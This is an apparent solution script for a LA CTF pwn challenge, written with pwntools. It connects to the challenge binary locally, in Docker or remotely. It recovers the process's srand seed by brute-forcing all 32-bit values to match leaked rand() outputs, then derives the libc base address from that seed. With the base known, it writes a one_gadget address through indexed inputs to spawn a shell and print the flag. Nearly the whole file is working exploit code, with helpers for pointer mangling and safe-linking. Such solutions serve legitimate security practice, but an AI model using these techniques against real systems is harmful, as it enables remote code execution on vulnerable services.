#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=False)
context.terminal = ["tmux", "splitw", "-h"]
# context.encoding = 'utf-8'

gdbscript = '''
b *run+321
# b *run+360
# b init
# tbreak main
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        kw.pop("ignore_environ", None)  # Ensure ignore_environ is not passed to remote
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

# io = get_conn(pre_argv, post_argv, gdbscript)
io = get_conn(pre_argv, post_argv, gdbscript, ignore_environ=True)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie
logleak = lambda **k: [success(f"{k}: {v:#x}") for k, v in k.items()]
has_space       = lambda data: any(c in {0x20, 0x09, 0x0a, 0x0b, 0x0c, 0x0d} for c in data)
is_scanf_safe   = lambda data: not has_space(data)
is_stream_safe  = lambda data: not has_space(data)
is_cin_safe     = lambda data: not has_space(data)
is_fgets_safe   = lambda data: (b'\n' not in data)
is_gets_safe    = lambda data: is_fgets_safe(data)
is_getline_safe = lambda data: is_fgets_safe(data)


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper


# *RAX  0x7ffff7ead420 (clock_gettime) ◂— mov rax, qword ptr [rip + 0x103a71]



def gen_seeds():
    import ctypes
    import ctypes.util

    libc_path = ctypes.util.find_library("./libc.so.6")
    libc = ctypes.CDLL(libc_path)
    libc.srand.argtypes = [ctypes.c_uint]
    libc.rand.restype = ctypes.c_int

    data = []
    for i in range(0xFFFFFFFF+1):
        if((i & 0xFFF) != 0x420):
            continue

        libc.srand(i)
        vals = [libc.rand() % 16 for _ in range(8)]
        data.append(f'seed: {i:#08x} -> {'-'.join(map(str, vals))}')

    with open("seeds", "wt") as f:
        for d in data:
            f.write(d)
            f.write('\n')

def find_seed(lock):
    import subprocess
    out = subprocess.check_output(f"cat seeds | grep {lock}", shell=True, text=True).strip()
    info(f"Output from grep: {out}")
    lines = out.splitlines()
    info(f"Found {len(lines)} seeds matching the lock value")
    return lines

# gen_seeds()



ru(b'reads: ')
lock1 = rl().strip().decode()

# call run again to get more rand values
idx = 10
lo = 0x532f  # call run from main
sla(b'turn', f'{idx} {lo} {idx+0x90} {0}'.encode())

ru(b'reads: ')
lock2 = rl().strip().decode()

seeds = find_seed(f'{lock1}-{lock2}')
assert len(seeds) != 0, "Expected to find at least one seed, but found none"
seed = int(seeds[0].split()[1], 16) # just select one, we need to brute remote anyway
info(f"Found seed:  {seed:#08x}")


libc = exe.libc
ogs = "311602 311609 311616 311623 311628 311644 311649 311652 311657 489197 489204 489211 489214 489219 489224 489229 489234 489254 872799 993170 993178 993183 993193"
ogs = list(map(int, ogs.split()))
libc.address = (0x7fff << 32 | seed) - 0xcf420
info(f"Libc base: {libc.address:#x}")
og = libc.address + ogs[int(args.X or "0")]

info(f"OG: {og:#x}")
hi, lo = (og >> 16) & 0xFFFF, og & 0xFFFF
info(f"hi: {hi:#x}, lo: {lo:#x}")

idx = 18
sla(b'turn', f'{idx} {lo} {idx+1} {hi}'.encode())

ia()

# lactf{pwn_challs_are_bits_in_binaries_cast_into_the_waves_of_time}

